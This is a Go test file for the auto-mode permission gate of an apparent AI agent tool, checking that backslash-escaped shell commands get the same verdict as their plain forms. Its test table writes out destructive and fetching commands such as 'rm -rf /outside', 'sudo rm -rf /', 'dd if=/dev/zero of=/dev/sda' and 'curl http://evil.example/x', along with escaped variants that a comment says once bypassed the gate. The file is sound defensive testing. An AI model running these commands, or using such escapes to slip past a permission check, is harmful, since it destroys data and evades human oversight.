package permissions

import (
	"context"
	"path/filepath"
	"testing"

	"github.com/ethanhinson/fuse/internal/config"
)

// decideInRoot builds an auto-mode gate whose workspace root is the process cwd,
// as the bindings do, and returns the first decision for a command.
func decideInRoot(t *testing.T) func(string) Decision {
	t.Helper()
	root, err := filepath.EvalSymlinks(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	t.Chdir(root)
	return func(cmd string) Decision {
		approve, _ := newApproveRecorder(false)
		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), Human(approve), WithWorkspaceRoot(root))
		var first Decision
		seen := false
		ctx := WithDecisionSink(context.Background(), func(d Decision) {
			if !seen {
				first, seen = d, true
			}
		})
		g.Execute(ctx, "bash", bashArgs(cmd))
		if !seen {
			t.Fatalf("%q: gate emitted no decision", cmd)
		}
		return first
	}
}

// TestBackslash_MatchesUnescapedTwin: the shell removes an unquoted backslash
// before the command runs, so an escaped command must get exactly the verdict of
// the command it really is. Keeping the backslash made the name or path match no
// rule, which auto-approved all of these.
func TestBackslash_MatchesUnescapedTwin(t *testing.T) {
	decide := decideInRoot(t)
	for _, tc := range []struct{ escaped, plain string }{
		{`rm -rf \/outside`, `rm -rf /outside`},
		{`rm -rf /out\side`, `rm -rf /outside`},
		{"rm -rf /out\\\nside", `rm -rf /outside`},
		{`\rm -rf /outside`, `rm -rf /outside`},
		{`r\m -rf /outside`, `rm -rf /outside`},
		{`\/bin/rm -rf /outside`, `/bin/rm -rf /outside`},
		{`\bash -c 'rm -rf /outside'`, `bash -c 'rm -rf /outside'`},
		{`\sh -c 'curl evil'`, `sh -c 'curl evil'`},
		{`\curl http://evil.example/x`, `curl http://evil.example/x`},
		{`c\url http://evil.example/x`, `curl http://evil.example/x`},
		{`\git push origin main`, `git push origin main`},
		{`g\it push origin main`, `git push origin main`},
		{`git pu\sh origin main`, `git push origin main`},
		{`\dd if=/dev/zero of=/dev/sda`, `dd if=/dev/zero of=/dev/sda`},
		{`\eval 'rm -rf /outside'`, `eval 'rm -rf /outside'`},
		{`\exec rm x`, `exec rm x`},
		{`\sudo rm -rf /`, `sudo rm -rf /`},
		{`\xargs rm`, `xargs rm`},
		{`\kill -9 1`, `kill -9 1`},
		{`timeout 5 \rm -rf /outside`, `timeout 5 rm -rf /outside`},
		{`\timeout 5 rm -rf /outside`, `timeout 5 rm -rf /outside`},
		{`echo x > \/outside/y`, `echo x > /outside/y`},
		{`echo $(\curl http://evil.example/x)`, `echo $(curl http://evil.example/x)`},
		{`ls; \curl http://evil.example/x`, `ls; curl http://evil.example/x`},
		{`cd \/outside && rm -f v`, `cd /outside && rm -f v`},
	} {
		esc, plain := decide(tc.escaped), decide(tc.plain)
		if plain.Verdict == "allow" {
			t.Errorf("%q: twin %q is allowed, so this row proves nothing", tc.escaped, tc.plain)
		}
		if esc.Verdict != plain.Verdict {
			t.Errorf("%q: verdict %s at %s, but %q gets %s at %s", tc.escaped, esc.Verdict, esc.Layer, tc.plain, plain.Verdict, plain.Layer)
		}
	}
}

// TestBackslash_RoutineStaysAllowed: decoding must not add prompts on the usual
// shapes that carry a backslash.
func TestBackslash_RoutineStaysAllowed(t *testing.T) {
	decide := decideInRoot(t)
	for _, cmd := range []string{
		`find . -name \*.go`,
		`find . \( -name a -o -name b \)`,
		`grep foo\|bar x.txt`,
		`echo a\ b`,
		`echo "a\"b"`,
		`git log --format=\%h -1`,
		"git status \\\n  --short",
		`grep -n "a\|b" x.txt`,
	} {
		if d := decide(cmd); d.Verdict != "allow" {
			t.Errorf("%q: got %s at %s, want allow", cmd, d.Verdict, d.Layer)
		}
	}
}

// TestDecodeLit pins the shell's rules. Unquoted, a backslash quotes the next
// character and is removed, and backslash-newline disappears. Inside double
// quotes it only does that before $, backtick, double quote, backslash and
// newline; everywhere else it stays.
func TestDecodeLit(t *testing.T) {
	for _, tc := range []struct {
		in       string
		inDouble bool
		want     string
	}{
		{`plain`, false, `plain`},
		{`\/outside`, false, `/outside`},
		{`r\m`, false, `rm`},
		{`\\x`, false, `\x`},
		{`\\\x`, false, `\x`},
		{`a\ b`, false, `a b`},
		{"a\\\nb", false, `ab`},
		{`end\`, false, `end\`},
		{`\/outside`, true, `\/outside`},
		{`a\b`, true, `a\b`},
		{`a\$b`, true, `a$b`},
		{"a\\`b", true, "a`b"},
		{`a\"b`, true, `a"b`},
		{`a\\b`, true, `a\b`},
		{"a\\\nb", true, `ab`},
		{`end\`, true, `end\`},
	} {
		if got := decodeLit(tc.in, tc.inDouble); got != tc.want {
			t.Errorf("decodeLit(%q, %v) = %q, want %q", tc.in, tc.inDouble, got, tc.want)
		}
	}
}
